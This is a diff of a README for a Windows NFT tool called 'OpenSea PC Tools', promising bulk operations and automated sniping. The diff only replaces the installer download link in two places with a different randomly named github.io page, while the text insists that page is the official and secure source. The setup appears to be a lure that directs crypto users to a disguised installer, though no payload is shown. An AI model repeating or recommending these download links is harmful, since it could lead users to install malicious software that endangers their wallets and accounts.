@@ -2,7 +2,7 @@
 
 OpenSea PC Tools is a comprehensive Windows desktop application designed to streamline your interaction with the OpenSea NFT marketplace. This powerful tool offers a suite of features for NFT management, including bulk operations, automated sniping, and portfolio tracking, all optimized for Windows 10 and 11. Whether you're a collector or trader, OpenSea PC Tools enhances efficiency and gives you an edge in the fast-paced world of NFTs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -68,7 +68,7 @@ OpenSea PC Tools is provided for educational and personal use only. The develope
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the official source for all updates and releases. Always download from this page to ensure you get the authentic and secure version of the tool.
 
